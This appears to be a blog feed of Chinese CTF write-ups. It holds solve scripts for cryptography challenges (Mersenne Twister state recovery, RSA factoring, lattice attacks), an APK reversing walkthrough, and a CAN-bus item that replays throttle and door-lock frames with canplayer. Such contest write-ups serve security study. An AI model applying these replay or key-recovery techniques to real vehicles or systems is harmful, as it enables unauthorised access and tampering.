class="hljs-string">&#x27;9acf027679a6d7a674a43dee4f5bea35&#x27;</span>,<br>     <span class="hljs-string">&#x27;78702a2b125a940519337b1bf50aff8a&#x27;</span>, <span class="hljs-string">&#x27;262cf3b8c8072a602048a24756c83fcf&#x27;</span>, <span class="hljs-string">&#x27;092f8d227ec583c4734a6f449de521a3&#x27;</span>,<br>     <span class="hljs-string">&#x27;712aa300302b57fed458553426348fce&#x27;</span>, <span class="hljs-string">&#x27;834d4a0ea451cc04b469636b18c56435&#x27;</span>, <span class="hljs-string">&#x27;754b5284b14402c61e3b1e56cb2d41e9&#x27;</span>,<br>     <span class="hljs-string">&#x27;51d742ca6a341032afcb5dc645f54bfa&#x27;</span>, <span class="hljs-string">&#x27;c1a33d104f47e33d6932905b483a2018&#x27;</span>, <span class="hljs-string">&#x27;3def7c2a14cff6b2864a2100956df07f&#x27;</span>,<br>     <span class="hljs-string">&#x27;7e3606e4ec1c99fe5a8593ae44f25a70&#x27;</span>, <span class="hljs-string">&#x27;404c6139570883dbab8e5a299d7a5017&#x27;</span>, <span class="hljs-string">&#x27;f07597079e1b68ebb4e2d16b83b7b484&#x27;</span>,<br>     <span class="hljs-string">&#x27;0723daf5c65f8ba6cd6e43fcdf9d18dc&#x27;</span>, <span class="hljs-string">&#x27;4c54db12829f165837384b66978e8438&#x27;</span>, <span class="hljs-string">&#x27;cd056e64e1f31461cab2e66ece9d3278&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f6ae16fab122cbce240e32464a1ab57&#x27;</span>, <span class="hljs-string">&#x27;f86e0e9ee23498340f62d8617f6f5218&#x27;</span>, <span class="hljs-string">&#x27;af4ebe2535885c783c89f8d8c4815076&#x27;</span>,<br>     <span class="hljs-string">&#x27;c8eae5b5c7aca2c5fdb4f284e2cf65c5&#x27;</span>, <span class="hljs-string">&#x27;bec0d8ecabedd9811a8ecb6052b21d8c&#x27;</span>, <span class="hljs-string">&#x27;731bd3421b6517aa101357fe1c49caf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;344f4a26cdaf1a782d9b32208e1a3e92&#x27;</span>, <span class="hljs-string">&#x27;892b1741d304878461dd0774a335ea3d&#x27;</span>, <span class="hljs-string">&#x27;56e2a484ca40f43e059bf5f0bd822bdc&#x27;</span>,<br>     <span class="hljs-string">&#x27;d7c0762df71b31c14654147fb9a0595c&#x27;</span>, <span class="hljs-string">&#x27;57016a179ba5509f6b04a161ac628b34&#x27;</span>, <span class="hljs-string">&#x27;e49a2d573522c1ee3e8348ceca0295a4&#x27;</span>,<br>     <span class="hljs-string">&#x27;4b0f49c7e6469e82832e9cc90b9e17c0&#x27;</span>, <span class="hljs-string">&#x27;eadc9d0c8b75127fe0a7f71881de1ea7&#x27;</span>, <span class="hljs-string">&#x27;db9fe5537768207bd8cdf770bcd42dfa&#x27;</span>,<br>     <span class="hljs-string">&#x27;ba2f57578752628d1ecac419b3a8bc36&#x27;</span>, <span class="hljs-string">&#x27;3752e70b5d2b578a8d412d84aab43705&#x27;</span>, <span class="hljs-string">&#x27;54e97795df8781c776cbb1ce4f5f31fc&#x27;</span>,<br>     <span class="hljs-string">&#x27;32794880abc9f68102c24e92ad9c7cd5&#x27;</span>,<br>     <span class="hljs-string">&#x27;b5eb7e651ca298f6873694c47d1cd3da&#x27;</span>, <span class="hljs-string">&#x27;a188934777d2c67e3d59692135005497&#x27;</span>, <span class="hljs-string">&#x27;34c308fa1644b387169ea88c1b575490&#x27;</span>]<br>    code=[<span class="hljs-string">&#x27;2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6&#x27;</span>,<br>     <span class="hljs-string">&#x27;017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6&#x27;</span>,<br>     <span class="hljs-string">&#x27;e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc&#x27;</span>,<br>     <span class="hljs-string">&#x27;0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c&#x27;</span>,<br>     <span class="hljs-string">&#x27;091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4&#x27;</span>,<br>     <span class="hljs-string">&#x27;5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630&#x27;</span>,<br>     <span class="hljs-string">&#x27;37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8&#x27;</span>,<br>     <span class="hljs-string">&#x27;c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10&#x27;</span>,<br>     <span class="hljs-string">&#x27;e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d&#x27;</span>,<br>     <span class="hljs-string">&#x27;f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217&#x27;</span>,<br>     <span class="hljs-string">&#x27;0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9&#x27;</span>,<br>     <span class="hljs-string">&#x27;abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d&#x27;</span>,<br>     <span class="hljs-string">&#x27;6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01&#x27;</span>,<br>     <span class="hljs-string">&#x27;b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b&#x27;</span>,<br>     <span class="hljs-string">&#x27;20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede&#x27;</span>,<br>     <span class="hljs-string">&#x27;606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f&#x27;</span>,<br>     <span class="hljs-string">&#x27;1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2&#x27;</span>,<br>     <span class="hljs-string">&#x27;fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5&#x27;</span>,<br>     <span class="hljs-string">&#x27;7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e&#x27;</span>,<br>     <span class="hljs-string">&#x27;ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7&#x27;</span>,<br>     <span class="hljs-string">&#x27;ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3&#x27;</span>,<br>     <span class="hljs-string">&#x27;4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e&#x27;</span>,<br>     <span class="hljs-string">&#x27;06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48&#x27;</span>,<br>     <span class="hljs-string">&#x27;947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56&#x27;</span>,<br>     <span class="hljs-string">&#x27;a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1&#x27;</span>,<br>     <span class="hljs-string">&#x27;31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d&#x27;</span>,<br>     <span class="hljs-string">&#x27;974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf&#x27;</span>,<br>     <span class="hljs-string">&#x27;e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07&#x27;</span>,<br>     <span class="hljs-string">&#x27;ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64&#x27;</span>,<br>     <span class="hljs-string">&#x27;86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd&#x27;</span>,<br>     <span class="hljs-string">&#x27;59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d&#x27;</span>,<br>     <span class="hljs-string">&#x27;02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63&#x27;</span>,<br>     <span class="hljs-string">&#x27;597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c&#x27;</span>,<br>     <span class="hljs-string">&#x27;bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374&#x27;</span>,<br>     <span class="hljs-string">&#x27;cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187&#x27;</span>,<br>     <span class="hljs-string">&#x27;1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97&#x27;</span>,<br>     <span class="hljs-string">&#x27;820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f&#x27;</span>,<br>     <span class="hljs-string">&#x27;e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc&#x27;</span>,<br>     <span class="hljs-string">&#x27;f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675&#x27;</span>,<br>     <span class="hljs-string">&#x27;a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75&#x27;</span>,<br>     <span class="hljs-string">&#x27;07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded&#x27;</span>,<br>     <span class="hljs-string">&#x27;a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489&#x27;</span>,<br>     <span class="hljs-string">&#x27;c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986&#x27;</span>,<br>     <span class="hljs-string">&#x27;6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6&#x27;</span>,<br>     <span class="hljs-string">&#x27;c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe&#x27;</span>,<br>     <span class="hljs-string">&#x27;040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2&#x27;</span>,<br>     <span class="hljs-string">&#x27;4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b&#x27;</span>]<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)):<br>        t1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">id</span>[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data.append(t1 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t1 &gt;&gt;= <span class="hljs-number">32</span><br>        t2 = <span class="hljs-built_in">int</span>(code[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            data.append(t2 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t2 &gt;&gt;= <span class="hljs-number">32</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>state1=recover_state(data)<br>state0=backtrace([<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+state1)[:<span class="hljs-number">624</span>]<br>ran=Random()<br>ran.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state0+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>id0=ran.getrandbits(<span class="hljs-number">128</span>)<br>code0=ran.getrandbits(<span class="hljs-number">256</span>)<br><span class="hljs-keyword">assert</span> ran.getrandbits(<span class="hljs-number">32</span>)==data[<span class="hljs-number">0</span>]<br>flag=md5((<span class="hljs-built_in">hex</span>(id0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)+<span class="hljs-built_in">hex</span>(code0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">64</span>)).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>%flag)<br><br><span class="hljs-comment">#flag&#123;22b307a4ac14c89888d5a6c79f7f963c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>jadx打开在MainActivity中发现判断逻辑<br><img src="/mdimg/2023hwswinter/1.png"><br>查看check函数<br><img src="/mdimg/2023hwswinter/2.png"><br>因为看到了check函数，根据逻辑去解发现解不出来<br><img src="/mdimg/2023hwswinter/3.png"><br>看到了c这个类中对enc这个文件进行了异或。将apk解压发现assets文件夹下有enc这个文件。按逻辑复原数据。<br><img src="/mdimg/2023hwswinter/4.png"><br>发现这是一个dex文件，接着用jadx打开<br><img src="/mdimg/2023hwswinter/5.png"><br>发现aes加密，网站直接解<br><img src="/mdimg/2023hwswinter/6.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sound-from-somewhere"><a href="#sound-from-somewhere" class="headerlink" title="sound from somewhere"></a>sound from somewhere</h2><p>一眼顶针为SSTV  使用MSSTV转换<br><img src="/mdimg/2023hwswinter/7.bmp"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
      <tag>Crypto</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWNHUB2022 冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 